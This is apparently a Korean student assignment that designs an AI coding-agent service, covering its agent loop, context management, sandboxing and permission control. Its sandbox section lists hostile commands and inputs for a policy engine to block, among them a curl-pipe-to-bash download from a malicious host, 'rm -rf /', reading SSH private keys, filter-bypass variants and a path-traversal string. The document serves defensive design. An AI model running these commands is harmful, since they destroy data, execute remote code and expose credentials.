https://www.linkedin.com/posts/arun-sharma-0a5970a1_ai-devops-kubernetes-share-7400974852242993152-MnST/

https://re-cinq.com/blog/ai-platform-reference-arch

https://learn.microsoft.com/en-us/azure/architecture/ai-ml/

https://temporal.io/

https://github.com/NVIDIA-NeMo/Guardrails

https://redis.io/docs/latest/develop/get-started/rag/

# Week 3 과제: AI 서비스 및 Agent 도구 시스템 설계

## ⒈ 문제 이해 및 설계 범위 확정

**시나리오**

- 사용자가 AI 코딩 Agent에게 자연어로 작업을 요청하면 AI는 단순히 텍스트 응답만 생성하는 것이 아니라 프로젝트 파일 탐색, 코드 수정, 명령 실행, 테스트 수행, 결과 검증 등의 tool들을 호출하며 작업을 수행한다.
    
    예를 들어:
    
    ```xml
    - "Docker 실행 오류 수정해줘"
    - "Redis 연결 실패 원인 분석해줘"
    - "테스트 코드 작성하고 실행해줘"
    - "이 프로젝트 구조 설명해줘"
    ```
    
    와 같은 요청에 대해 AI Agent는 여러 tool들을 순차적으로 호출하며 작업을 진행한다. 사용자는 작업 진행 상황과 로그를 실시간으로 확인할 수 있어야 하며 긴 작업 도중 연결이 끊겨도 상태가 유지되어야 한다.
    
    그 외 시나리오는 자유롭게 구체화해도 좋다.
    
    ```xml
    AI DevOps Agent
    AI Data Analysis Agent
    AI Browser Agent
    AI 문서 자동화 Agent
    AI 코드 리뷰 Agent... 등등
    ```
    

## 설계 범위 (In / Out of Scope)

---

| 포함 (In Scope) | 제외 (Out of Scope) |
| --- | --- |
| 사용자 요청 처리 흐름 | LLM 자체 학습 |
| Agent 실행 흐름 | 모델 파인튜닝 |
| Tool Calling 구조 | GPU 인프라 |
| 파일 탐색 / 코드 수정 | Transformer 구조 |
| 명령 실행 / 결과 검증 | 벡터 모델 구현 |
| 스트리밍 응답 | IDE 자체 구현 |
| 장시간 작업 처리 | 실제 컨테이너 런타임 구현 |
| 작업 상태 관리 | 운영체제 구현 |
| Sandbox / 권한 제어 | 완전한 보안 솔루션 개발 |
| 실패 복구 및 재시도 | 자체 LLM 개발 |

## 시스템 구성 전제

---

- 외부 LLM API(OpenAI, Claude 등)를 사용한다고 가정
- Tool 실행용 Sandbox(Container)는 이미 준비되어 있다고 가정
- 사용자는 로그인 상태라고 가정
- 파일 저장소 및 Git Repository는 외부 시스템 사용 가능
- AI 서비스는 Tool orchestration과 상태 관리를 책임진다

## 기능 요구사항

---

- 사용자의 자연어 요청을 처리할 수 있어야 한다
- AI Agent는 상황에 따라 여러 Tool을 호출할 수 있어야 한다
- Tool 실행 결과를 기반으로 추가 작업을 수행할 수 있어야 한다
- 작업 진행 상황을 사용자에게 실시간 스트리밍할 수 있어야 한다
- 긴 작업을 비동기로 처리할 수 있어야 한다
- 작업 실패 시 재시도 또는 복구가 가능해야 한다
- 여러 사용자의 동시 작업을 처리할 수 있어야 한다
- Tool 실행 권한 범위를 제한할 수 있어야 한다

## 비기능 요구사항

---

| 항목 | 목표 |
| --- | --- |
| 첫 응답 시작 시간 | 3초 이내 |
| 스트리밍 지연 | 평균 1초 이하 |
| Tool 실행 실패 복구 | 자동 재시도 가능 |
| 장시간 작업 처리 | 최대 수십 분 |
| 작업 상태 복구 | 서버 재시작 이후에도 유지 |
| 동시 실행 작업 수 | 수천 개 이상 |
| Agent 응답 일관성 | 동일 작업 중복 실행 방지 |

## 대략적 규모 추정 *(기준값 — 본인 가정으로 변경 가능)*

---

| 항목 | 수치 |
| --- | --- |
| MAU / DAU | 약 500,000명 / 약 100,000명 |
| 일일 Agent 작업 수 | 약 2,000,000건 |
| 평균 Tool 호출 횟수 | 작업당 5~20회 |
| 평균 작업 시간 | 30초 ~ 10분 |
| 장시간 작업 비율 | 약 10% |
| 동시 실행 작업 수 | 약 20,000건 |
| 평균 스트리밍 연결 유지 시간 | 약 2~5분 |
| 피크 시간대 | 평일 업무 시간대 |

---

# 2. 개략적 설계안 제시 및 동의 구하기

## 핵심 흐름

AI Agent 시스템은 사용자의 자연어 요청을 받아 단순히 답변을 생성하는 것이 아니라, 필요한 도구를 선택하고 실행하며 작업을 완료하는 구조로 설계한다.

예를 들어 사용자가 다음과 같이 요청했다고 가정한다.

```xml
"Redis 연결 실패 원인 분석해줘"
```

이때 Agent는 바로 답변을 생성하지 않고, 다음과 같은 흐름으로 작업을 수행한다.

```text
1. 사용자 요청 수신
2. Agent가 작업 목표 분석
3. 필요한 컨텍스트 수집
   - 프로젝트 파일 목록 조회
   - 설정 파일 탐색
   - Docker Compose / Kubernetes Manifest 확인
   - 로그 파일 확인
4. LLM에게 현재 상황과 수집한 정보를 전달
5. LLM이 다음 Tool 실행 계획 결정
6. Tool 실행
   - 파일 읽기
   - 명령 실행
   - 테스트 실행
   - 로그 분석
7. Tool 결과를 Agent 상태에 저장
8. 결과를 바탕으로 다음 행동 결정
9. 원인 분석 또는 코드 수정 수행
10. 사용자에게 진행 상황 스트리밍
11. 최종 결과 요약 및 검증 결과 제공
```

이 시스템에서 중요한 점은 **LLM이 모든 것을 직접 처리하지 않는다는 것**이다.

LLM은 판단과 추론을 담당하고, 실제 파일 탐색, 코드 수정, 명령 실행, 테스트 수행은 Tool과 Sandbox가 담당한다. AI 서비스는 이 둘 사이에서 **작업 상태 관리, Tool 실행 순서 제어, 실패 복구, 권한 제한, 사용자 응답 스트리밍**을 책임진다.

---

## 개략적 아키텍처 다이어그램

![archi](images\haejun\archi.png)
---

## 개략적 설계 설명

전체 시스템은 크게 다음 영역으로 나눌 수 있다.

| 영역                 | 역할                              |
| ------------------ | ------------------------------- |
| Client Layer       | 사용자 요청 입력, 작업 진행 상황 확인          |
| AI Service API     | 인증 확인, 요청 수신, Agent Run 생성      |
| Agent Orchestrator | 작업 계획 수립, Tool 호출 순서 결정, 상태 관리  |
| Context Manager    | 대화 기록, 파일 정보, Tool 결과, 요약 정보 관리 |
| Tool Router        | 사용 가능한 Tool 목록 관리, 실행 요청 전달     |
| Sandbox Container  | 실제 명령 실행, 테스트 수행, 코드 수정         |
| Workflow / Queue   | 장시간 작업 처리, 재시도, 서버 장애 복구        |
| Streaming Server   | 사용자에게 진행 상황과 로그를 실시간 전달         |
| Guardrails         | 위험 요청, 위험 명령, 민감 정보, 출력 검증      |
| Observability      | 로그, 메트릭, 추적, 감사 기록 저장           |

이 설계의 핵심은 **Agent 실행을 하나의 긴 대화가 아니라 상태를 가진 작업 단위로 관리하는 것**이다.

즉, 사용자의 요청 하나는 `Agent Run`으로 생성되고, 그 안에서 여러 개의 `Step`이 실행된다.

```text
Agent Run
 ├── Step 1: 요청 분석
 ├── Step 2: 파일 목록 조회
 ├── Step 3: 설정 파일 읽기
 ├── Step 4: docker compose 실행 로그 확인
 ├── Step 5: 원인 후보 정리
 ├── Step 6: 코드 수정
 ├── Step 7: 테스트 실행
 └── Step 8: 최종 응답 생성
```

이렇게 설계하면 작업 중간에 서버가 재시작되거나 사용자의 연결이 끊겨도, 저장된 Run/Step 상태를 기반으로 작업을 이어갈 수 있다.

---

# 3. 상세 설계

## 설계 대상 컴포넌트 사이의 우선순위 정하기 / 아키텍처 다이어그램

AI Agent 시스템을 설계할 때 모든 컴포넌트를 같은 비중으로 보면 안 된다.
이 시스템에서 가장 중요한 것은 다음 순서라고 볼 수 있다.

```text
1. Agent Orchestrator
2. Context Manager
3. Tool Router / Sandbox
4. Workflow / Queue
5. Streaming Server
6. Guardrails / Policy Engine
7. Observability
```

가장 중요한 컴포넌트는 **Agent Orchestrator**다.
사용자의 요청을 어떤 단계로 나눌지, 어떤 Tool을 호출할지, Tool 결과를 보고 다음 행동을 어떻게 결정할지 모두 이 영역에서 처리된다.

그다음으로 중요한 것은 **Context Manager**다.
AI Agent는 작업을 진행하면서 많은 정보를 다룬다. 대화 기록, 파일 내용, 명령 실행 결과, 오류 로그, 수정한 파일, 실패한 시도 등을 모두 LLM에게 그대로 넣을 수는 없다. 따라서 필요한 정보만 골라서 유지하고, 오래된 정보는 요약하거나 검색 가능한 형태로 저장해야 한다.

세 번째로 중요한 것은 **Sandbox 및 Tool 실행 구조**다.
AI Agent가 실제로 파일을 수정하고 명령을 실행할 수 있다면, 보안 문제가 반드시 발생한다. 따라서 사용자별 격리, 파일 접근 제한, 위험 명령 차단, 네트워크 접근 제한이 필요하다.

---

## 상세 아키텍처 다이어그램

이건 너무 복잡해서 AI의 힘을 빌리겠습니다 ㅠ

```mermaid
flowchart TB
  subgraph Client["Client"]
    U["User"]
    UI["Web UI<br/>Chat + Progress Log"]
  end

  subgraph API["AI Service API Layer"]
    Auth["Auth Middleware<br/>User / Session 확인"]
    RunAPI["Agent Run API<br/>Run 생성 / 조회 / 중단"]
    StreamAPI["Streaming API<br/>SSE or WebSocket"]
  end

  subgraph AgentCore["Agent Core"]
    Orchestrator["Agent Orchestrator"]
    Planner["Planner<br/>작업 분해"]
    Executor["Step Executor<br/>단계 실행"]
    StateManager["State Manager<br/>Run / Step 상태 저장"]
  end

  subgraph ContextLayer["Context Layer"]
    ContextBuilder["Context Builder"]
    Summarizer["Summarizer<br/>긴 로그 / 파일 요약"]
    Retriever["Retriever<br/>필요 파일 검색"]
    Memory["Agent Memory<br/>이전 Tool 결과 / 실패 원인 / 수정 파일"]
  end

  subgraph ToolLayer["Tool Layer"]
    Registry["Tool Registry"]
    Router["Tool Router"]
    Policy["Tool Policy Checker"]
    Sandbox["Sandbox Container"]
  end

  subgraph Storage["Storage Layer"]
    DB["Main DB<br/>User, Conversation, Run, Step"]
    Redis["Redis<br/>Session, Cache, Pub/Sub"]
    VectorDB["Vector Store<br/>Code / Docs Embedding"]
    ObjectStore["File Storage<br/>Uploaded Files, Artifacts"]
    GitRepo["External Git Repository"]
  end

  subgraph Workflow["Async Execution Layer"]
    Queue["Task Queue"]
    Worker["Agent Worker"]
    Retry["Retry Controller"]
  end

  subgraph External["External Services"]
    LLM["External LLM API"]
    Embed["Embedding API"]
    ExternalAPI["External APIs"]
  end

  U --> UI
  UI --> Auth
  Auth --> RunAPI
  UI --> StreamAPI

  RunAPI --> Orchestrator
  Orchestrator --> Planner
  Planner --> ContextBuilder
  ContextBuilder --> Retriever
  ContextBuilder --> Summarizer
  ContextBuilder --> Memory

  Retriever --> VectorDB
  Retriever --> GitRepo
  Retriever --> ObjectStore
  Memory --> DB
  Memory --> Redis

  Planner --> LLM
  Orchestrator --> Executor
  Executor --> Router
  Router --> Registry
  Router --> Policy
  Policy --> Sandbox

  Sandbox --> GitRepo
  Sandbox --> ObjectStore
  Sandbox --> ExternalAPI

  Orchestrator --> StateManager
  StateManager --> DB
  StateManager --> Redis

  Orchestrator --> Queue
  Queue --> Worker
  Worker --> Executor
  Retry --> Queue

  StreamAPI --> Redis
  Executor --> Redis
  Orchestrator --> StreamAPI

  ContextBuilder --> Embed
  Embed --> VectorDB
```

---

# 3-1. Agent 실행 흐름 관리

## Agent loop 설계

Agent는 한 번의 LLM 호출로 끝나는 구조가 아니라, 여러 단계를 반복하는 loop 구조로 동작한다.

```text
while 작업이 완료되지 않았고 최대 step 수를 넘지 않았다:
    1. 현재 상태와 컨텍스트를 구성한다
    2. LLM에게 다음 행동을 판단하게 한다
    3. LLM이 Tool 호출 또는 최종 답변을 선택한다
    4. Tool 호출이 필요하면 실행한다
    5. 실행 결과를 상태에 저장한다
    6. 사용자에게 진행 상황을 스트리밍한다
    7. 다음 loop로 이동한다
```

예시는 다음과 같다.

```text
User: "테스트 실패 원인 분석해줘"

Step 1. 프로젝트 구조 조회
Step 2. package.json / pytest.ini / build.gradle 등 확인
Step 3. 테스트 명령 실행
Step 4. 실패 로그 수집
Step 5. 관련 파일 검색
Step 6. 원인 후보 정리
Step 7. 코드 수정
Step 8. 테스트 재실행
Step 9. 최종 결과 보고
```

---

## Tool 결과를 다음 추론 단계로 연결하는 방법

Tool 실행 결과는 단순 로그로 버리면 안 된다.
다음 LLM 호출에서 사용할 수 있도록 구조화해서 저장해야 한다.

```json
{
  "step_id": "step-004",
  "tool_name": "run_command",
  "input": "pytest tests/",
  "status": "failed",
  "stdout": "...",
  "stderr": "ModuleNotFoundError: No module named 'redis'",
  "summary": "pytest 실행 중 redis 모듈이 없어 테스트가 실패함",
  "created_at": "2026-05-20T10:00:00"
}
```

LLM에게는 전체 로그를 항상 전달하지 않고, 다음과 같이 요약된 형태를 우선 전달한다.

```text
이전 Tool 실행 결과:
- 실행 명령: pytest tests/
- 결과: 실패
- 주요 오류: ModuleNotFoundError: No module named 'redis'
- 추정 원인: 의존성 누락 또는 가상환경 설정 문제
```

전체 로그는 DB나 Object Storage에 저장하고, 필요할 때만 다시 조회한다.

---

## Stateless vs Stateful Agent trade-off

| 방식              | 설명                        | 장점                  | 단점             |
| --------------- | ------------------------- | ------------------- | -------------- |
| Stateless Agent | 매 요청마다 전체 컨텍스트를 다시 구성     | 서버 구조 단순, 확장 쉬움     | 긴 작업 상태 유지 어려움 |
| Stateful Agent  | Run/Step/Tool 결과를 저장하며 진행 | 장시간 작업, 복구, 재시도에 유리 | 상태 관리 복잡도 증가   |

이 과제에서는 **Stateful Agent 구조**가 적합하다.

이유는 다음과 같다.

```text
1. 작업 시간이 수분 이상 걸릴 수 있음
2. Tool 호출이 여러 번 발생함
3. 사용자가 중간 진행 상황을 확인해야 함
4. 연결이 끊겨도 상태 복구가 필요함
5. 서버 장애 이후에도 작업 재개가 필요함
```

따라서 사용자의 요청 하나를 `Agent Run`으로 만들고, 내부 실행 단계를 `Step`으로 저장하는 구조가 적절하다.

---


# 3-2. 컨텍스트 관리

## 긴 대화의 context window 관리

LLM은 한 번에 넣을 수 있는 context window가 제한되어 있다.
따라서 긴 대화, 큰 프로젝트, 긴 로그를 모두 프롬프트에 넣을 수 없다.

예를 들어 프로젝트가 다음과 같다고 가정한다.

```text
project/
 ├── src/
 │   ├── api/
 │   ├── service/
 │   ├── repository/
 │   └── config/
 ├── tests/
 ├── docker-compose.yml
 ├── package.json
 ├── README.md
 └── logs/
```

사용자가 “Redis 연결 실패 원인 분석해줘”라고 요청했을 때 전체 파일을 모두 읽는 것은 비효율적이다.
대신 다음 순서로 필요한 파일만 좁혀가야 한다.

```text
1. 프로젝트 루트 파일 목록 확인
2. Redis 관련 키워드 검색
   - redis
   - REDIS_HOST
   - REDIS_PORT
   - connection
3. 설정 파일 우선 확인
   - .env
   - docker-compose.yml
   - application.yml
   - config.ts
4. 에러 로그 확인
5. 관련 코드 파일 확인
6. 필요한 경우 테스트 실행
```

즉, 컨텍스트 관리는 “많이 넣는 것”이 아니라 **현재 작업에 필요한 정보를 선택하는 것**이다.

---

## 파일 / Tool 결과 요약 및 압축

Tool 실행 결과는 다음 세 단계로 관리한다.

```text
1. Raw Data
   - 원본 로그
   - 전체 파일 내용
   - 명령 실행 결과

2. Structured Summary
   - 핵심 오류
   - 관련 파일
   - 원인 후보
   - 다음 행동 후보

3. Working Context
   - 다음 LLM 호출에 실제로 넣을 최소 정보
```

예시는 다음과 같다.

```text
Raw Log:
ModuleNotFoundError: No module named 'redis'
...
전체 pytest 로그 3,000줄

Structured Summary:
- pytest 실행 실패
- 주요 원인: redis Python 패키지 누락
- 관련 파일: requirements.txt, tests/test_redis.py
- 다음 후보 작업: requirements.txt 확인

Working Context:
pytest 실행 결과 redis 모듈이 없어 실패했다. requirements.txt에 redis 패키지가 포함되어 있는지 확인해야 한다.
```

이렇게 하면 LLM context를 절약하면서도 작업의 연속성을 유지할 수 있다.

---

## Retrieval 구조는 필요한가?

필요하다.

AI Agent가 다루는 프로젝트는 수십 개 파일이 아니라 수천 개 파일일 수 있다.
사용자의 요청과 관련 있는 파일을 찾기 위해서는 단순히 전체 파일을 프롬프트에 넣는 방식이 아니라 Retrieval 구조가 필요하다.

```mermaid
flowchart LR
  UserQuery["User Query<br/>Redis 연결 오류 분석"] --> Search["Code Search / Keyword Search"]
  Search --> Candidate["Candidate Files<br/>docker-compose.yml, config.py, redis_client.py"]
  Candidate --> Read["Read Selected Files"]
  Read --> Summary["Summarize Relevant Context"]
  Summary --> LLM["LLM Reasoning"]
```

Retrieval 방식은 여러 가지를 조합할 수 있다.

| 방식           | 용도                                    |
| ------------ | ------------------------------------- |
| 파일명 검색       | config, redis, docker 등 관련 파일 탐색      |
| 키워드 검색       | REDIS_HOST, RedisClient, connection 등 |
| AST 기반 검색    | 함수, 클래스, import 관계 분석                 |
| Embedding 검색 | 자연어 요청과 의미적으로 가까운 코드 검색               |
| Git diff 검색  | 최근 변경된 파일 우선 확인                       |

코딩 Agent에서는 보통 **키워드 검색 + 파일명 검색 + Git diff + Embedding 검색**을 함께 쓰는 것이 좋다.

---

## Agent 메모리는 어디까지 유지할 것인가?

Agent 메모리는 크게 세 종류로 나눌 수 있다.

| 메모리 종류            | 설명                    | 저장 위치             |
| ----------------- | --------------------- | ----------------- |
| Short-term Memory | 현재 Run에서 필요한 정보       | Redis / DB        |
| Working Memory    | 현재 Step에서 LLM에게 넣는 정보 | Prompt Context    |
| Long-term Memory  | 사용자/프로젝트 단위로 재사용할 정보  | DB / Vector Store |

현재 작업 안에서 반드시 기억해야 하는 정보는 다음과 같다.

```text
1. 사용자의 원래 요청
2. 현재 작업 목표
3. 이미 실행한 Tool 목록
4. 실패한 시도
5. 수정한 파일 목록
6. 테스트 결과
7. 원인 후보
8. 남은 작업
```

예를 들어 Agent가 다음 작업을 하고 있다고 하자.

```text
1. docker-compose.yml 수정
2. .env 파일 확인
3. Redis host 설정 변경
4. 테스트 실행
```

이때 Agent는 자신이 이미 `docker-compose.yml`을 수정했다는 사실을 기억해야 한다.
그렇지 않으면 같은 파일을 반복 수정하거나, 이전에 실패한 방식을 다시 시도할 수 있다.

따라서 Agent Run 내부에는 다음과 같은 상태가 필요하다.

```json
{
  "run_id": "run-123",
  "goal": "Redis 연결 실패 원인 분석 및 수정",
  "current_status": "testing",
  "modified_files": [
    "docker-compose.yml",
    ".env"
  ],
  "failed_attempts": [
    "REDIS_PORT만 변경했지만 테스트 실패"
  ],
  "latest_test_result": "failed",
  "next_action": "redis service name과 application config 비교"
}
```

---

## 컨텍스트 관리 전략 요약

이 과제에서는 다음 전략을 사용한다.

```text
1. 전체 파일을 LLM에 넣지 않는다
2. 파일 목록과 검색을 통해 관련 파일을 먼저 좁힌다
3. 긴 로그는 요약하고 원본은 별도 저장한다
4. Tool 결과는 구조화해서 저장한다
5. 현재 작업에 필요한 Working Context만 LLM에 전달한다
6. Run 단위 메모리는 유지하되, 장기 메모리는 제한적으로 사용한다
```

---

# 3-3. Sandbox 및 권한 제어

## Tool 실행 권한을 어떻게 제한할 것인가?

AI Agent가 명령을 실행할 수 있다면, 보안 문제가 반드시 발생한다.

예를 들어 LLM이 다음과 같은 명령을 실행하려 할 수 있다.

```bash
rm -rf /
curl http://malicious-site.com/script.sh | bash
cat ~/.ssh/id_rsa
chmod -R 777 /
docker run --privileged ...
```

따라서 Tool 실행은 LLM이 직접 수행하면 안 된다.
반드시 Agent Orchestrator와 Policy Engine이 중간에서 검증해야 한다.

기본 구조는 다음과 같다.

![권한 제어](images\haejun\accesscontrol.png)
---

## 권한 모델

Tool마다 필요한 권한을 명시한다.

```json
{
  "tool_name": "read_file",
  "required_permission": "file:read"
}
```

```json
{
  "tool_name": "write_file",
  "required_permission": "file:write"
}
```

```json
{
  "tool_name": "run_command",
  "required_permission": "command:execute"
}
```

사용자 또는 작업 단위로 허용 권한을 제한한다.

| 권한                | 설명              |
| ----------------- | --------------- |
| `file:read`       | 파일 읽기           |
| `file:write`      | 파일 수정           |
| `command:execute` | 명령 실행           |
| `network:access`  | 외부 네트워크 접근      |
| `git:read`        | Git 상태 조회       |
| `git:write`       | 커밋, push, PR 생성 |
| `secret:read`     | 민감 정보 조회, 기본 차단 |

기본적으로는 최소 권한 원칙을 적용한다.

1. 읽기 권한은 제한적으로 허용
2. 쓰기 권한은 workspace 내부로 제한
3. 명령 실행은 allowlist 기반으로 제한
4. secret 접근은 기본 차단
5. 외부 네트워크 접근은 필요 시에만 허용

---

## 위험 명령 실행 차단

명령 실행은 denylist만으로는 부족하다.
가능하면 allowlist 기반으로 제한하는 것이 좋다.

허용 가능한 명령 예시는 다음과 같다.

```bash
ls
cat
grep
find
npm test
pytest
go test
mvn test
gradle test
docker compose config
git status
git diff
```

위험 명령 예시는 다음과 같다.

```bash
rm -rf
sudo
su
chmod -R 777
chown
mkfs
mount
curl | bash
wget | bash
ssh
scp
nc
nmap
docker --privileged
```

명령 검사는 단순 문자열 비교만으로는 부족하다.
다음과 같은 우회가 가능하기 때문이다.

```bash
rm -r -f /
/bin/rm -rf /
python -c "import os; os.system('rm -rf /')"
```

따라서 최소한 다음 검사가 필요하다.

1. 명령어 파싱
2. 실행 바이너리 검사
3. 인자 검사
4. 작업 디렉터리 검사
5. 파일 경로 검사
6. 네트워크 접근 여부 검사
7. 실행 시간 제한
8. 출력 크기 제한

---

## 사용자별 작업 환경 격리

사용자별 작업은 반드시 격리되어야 한다.

```text
User A의 Agent Run
 → Sandbox A
 → Workspace A
 → Token A

User B의 Agent Run
 → Sandbox B
 → Workspace B
 → Token B
```

격리 기준은 다음과 같다.

| 격리 대상  | 방식                        |
| ------ | ------------------------- |
| 파일 시스템 | 사용자/Run별 workspace 분리     |
| 프로세스   | Sandbox Container 단위 격리   |
| 네트워크   | 기본 차단, 필요한 endpoint만 허용   |
| Secret | 사용자별 임시 토큰, 최소 권한         |
| 리소스    | CPU / Memory / Timeout 제한 |
| 로그     | 사용자별 접근 제어                |

Sandbox는 다음과 같은 제한을 가져야 한다.

1. root 권한 금지
2. privileged container 금지
3. hostPath mount 금지
4. workspace 외부 접근 금지
5. CPU / Memory 제한
6. 실행 시간 제한
7. 네트워크 egress 제한
8. 민감 환경변수 노출 금지

---

## 파일 접근 범위 제한

Agent가 접근 가능한 파일 범위는 workspace 내부로 제한한다.

허용 예시:

```text
/workspace/project/src/app.py
/workspace/project/package.json
/workspace/project/tests/test_app.py
```

차단 예시:

```text
/etc/passwd
/root/.ssh/id_rsa
/home/other-user/project
/var/run/docker.sock
```

파일 접근 전에는 path normalization을 수행해야 한다.

```text
사용자 입력:
../../../../etc/passwd

정규화 결과:
/etc/passwd

검사 결과:
workspace 외부이므로 차단
```

이 검사가 없으면 path traversal 공격이 가능하다.

---

## Secret 관리

AI Agent는 secret을 직접 출력하거나 LLM context에 넣으면 안 된다.

예를 들어 `.env` 파일을 읽었을 때 다음과 같은 값이 있을 수 있다.

DATABASE_URL=postgres://user:password@host:5432/db
OPENAI_API_KEY=sk-xxxx
GITHUB_TOKEN=ghp_xxxx

이 경우 Agent는 다음처럼 처리해야 한다.

1. secret pattern 감지
2. 로그와 LLM context에서는 마스킹
3. 필요 시 존재 여부만 전달
4. 실제 값은 Tool 실행 시에만 제한적으로 사용


LLM에게 전달하는 컨텍스트는 다음처럼 바꾼다.

.env 파일에 DATABASE_URL 값이 존재한다.
.env 파일에 OPENAI_API_KEY 값이 존재한다.
실제 secret 값은 보안상 전달하지 않는다.

---

## Sandbox 및 권한 제어 전략 요약

이 설계에서는 다음 원칙을 사용한다.

1. LLM은 Tool 실행을 제안할 뿐 직접 실행하지 않는다
2. 모든 Tool 실행은 Policy Engine을 통과해야 한다
3. 사용자별 Sandbox와 Workspace를 분리한다
4. 파일 접근은 workspace 내부로 제한한다
5. 위험 명령은 allowlist/denylist와 인자 검사를 함께 적용한다
6. 네트워크 접근은 기본 차단하고 필요한 경우만 허용한다
7. Secret은 LLM context에 넣지 않고 마스킹한다
8. 모든 Tool 실행 기록은 감사 로그로 남긴다

---

# 4. 설계 장점

## 1. 장시간 작업에 적합하다

Agent Run과 Step 상태를 DB에 저장하기 때문에 작업이 수분 이상 걸려도 관리할 수 있다.
사용자의 연결이 끊겨도 `run_id`를 통해 작업 상태를 다시 조회할 수 있다.

---

## 2. Tool 실행 과정을 추적할 수 있다

각 Tool 실행이 Step 단위로 저장되므로, Agent가 어떤 판단을 했고 어떤 명령을 실행했는지 확인할 수 있다.

- 어떤 파일을 읽었는가?
- 어떤 명령을 실행했는가?
- 어떤 로그를 보고 판단했는가?
- 어떤 파일을 수정했는가?
- 테스트 결과는 어땠는가?

이는 디버깅, 감사 로그, 사용자 신뢰 측면에서 중요하다.

---

## 3. 보안 제어를 중앙에서 수행할 수 있다

LLM이 직접 Tool을 실행하지 않고, 모든 Tool 호출이 Policy Engine을 통과한다.
이를 통해 위험 명령, 권한 없는 파일 접근, secret 노출을 제한할 수 있다.

---

## 4. 확장성이 높다

API 서버와 Worker를 분리했기 때문에 트래픽 증가 시 Worker를 확장할 수 있다.
또한 Tool Registry 구조를 사용하면 새로운 Tool을 추가하기 쉽다.

기존 Tool:
- read_file
- run_command
- run_test

추가 가능한 Tool:
- browser_search
- create_pr
- deploy_preview
- analyze_logs
- query_database

---

## 5. 컨텍스트 비용을 줄일 수 있다

모든 파일과 로그를 LLM에 넣지 않고, 필요한 정보만 검색하고 요약해서 사용한다.
이를 통해 토큰 비용을 줄이고 응답 품질도 안정화할 수 있다.

---

# 5. 설계 단점

## 1. 시스템 복잡도가 높다

단순 Chatbot에 비해 필요한 컴포넌트가 많다.

- Agent Orchestrator
- Tool Router
- Sandbox
- State Manager
- Queue
- Worker
- Streaming Server
- Guardrails
- Observability

따라서 초기 구현 비용이 높다.

---

## 2. 상태 관리가 어렵다

Agent는 여러 단계에 걸쳐 작업을 수행한다.
중간에 실패하거나 재시도할 때, 어떤 Step까지 성공했는지 정확히 관리해야 한다.

상태 관리가 부정확하면 다음 문제가 발생할 수 있다.

- 같은 파일을 반복 수정
- 같은 명령을 중복 실행
- 이미 생성한 PR을 다시 생성
- 실패한 작업을 성공으로 표시

---

## 3. 보안 설계가 어렵다

AI Agent는 파일을 읽고, 명령을 실행하고, 외부 시스템에 접근할 수 있다.
이는 일반적인 Chatbot보다 훨씬 위험하다.

특히 다음 문제가 중요하다.

- 위험 명령 실행
- secret 노출
- 사용자 간 workspace 침범
- 외부 네트워크 오남용
- prompt injection을 통한 정책 우회

---

## 4. LLM API 비용과 rate limit에 영향을 받는다

외부 LLM API를 사용하기 때문에 다음 문제가 발생할 수 있다.

- 요청량 증가 시 비용 증가
- 모델 API 장애 시 서비스 영향
- rate limit으로 인한 작업 지연
- 긴 context 사용 시 비용 증가

따라서 모델 선택, context 압축, queue 대기, fallback 전략이 필요하다.

---

## 5. Agent 결과를 항상 신뢰하기 어렵다

Agent가 Tool을 사용하더라도 잘못된 결론을 낼 수 있다.
예를 들어 테스트를 한 번만 실행하고 “문제가 해결됐다”고 판단할 수도 있다.

따라서 중요한 작업에서는 다음 검증 과정이 필요하다.

- 변경 사항 diff 확인
- 테스트 재실행
- lint / build 확인
- 사용자 승인
- rollback 가능성 확보

---

# 6. 마무리

## 개인적 의견 / 사례 공유 / 추가 학습

AI Agent를 많이 사용하곤 있지만, 이렇게까지 구조에 대해 고찰하진 못했었다.
이번주 학습을 통해 막연하게 이런 구조겠구나~ 하던 내용을 머리 속에 정립할 수 있는 시간이었다.

AI Agent 시스템은 단순히 LLM API를 감싸는 서비스가 아니다.
오히려 구조적으로 보면 **작업 실행 플랫폼**에 가깝다.

일반 Chatbot은 사용자의 질문에 답변하는 것이 핵심이지만, AI Agent는 사용자의 목표를 달성하기 위해 여러 Tool을 호출하고, 실패를 복구하며, 작업 상태를 유지해야 한다.

특히 아래의 내용들을 고려해야 한다고 생각한다.

1. Agent가 어디까지 자동으로 실행해도 되는가?
2. 어떤 작업은 사용자 승인이 필요한가?
3. Tool 실행 결과를 어떻게 검증할 것인가?
4. 긴 로그와 많은 파일을 어떻게 context로 관리할 것인가?
5. Sandbox에서 어떤 명령을 허용하고 차단할 것인가?
6. 사용자의 작업 환경을 어떻게 격리할 것인가?
7. 실패한 작업을 어떻게 재시도하거나 복구할 것인가?

개인적으로 이 주제에서 가장 중요한 부분은 **컨텍스트 관리와 Sandbox 보안**이라고 생각한다.

컨텍스트 관리가 부족하면 Agent는 프로젝트 전체를 제대로 이해하지 못하고, 잘못된 파일을 수정하거나 같은 실수를 반복할 수 있다. 반대로 모든 정보를 LLM에 넣으려고 하면 비용이 커지고 품질도 떨어진다. 따라서 필요한 정보를 찾고, 요약하고, 현재 작업에 맞게 압축하는 구조가 필요하다.

Sandbox 보안은 Agent 시스템의 안전성을 결정한다. AI가 명령을 실행할 수 있다는 것은 매우 강력하지만, 그만큼 위험하다. 따라서 LLM이 직접 명령을 실행하는 구조가 아니라, 항상 Policy Engine과 권한 검사를 거쳐야 한다. 사용자별 workspace 격리, 위험 명령 차단, secret masking, 네트워크 제한은 필수적으로 고려해야 한다.

결론적으로 AI Agent 시스템은 다음과 같이 정리할 수 있다.

```text
AI Agent = LLM + Tool Calling + State Management + Context Management + Sandbox Security + Workflow Orchestration
```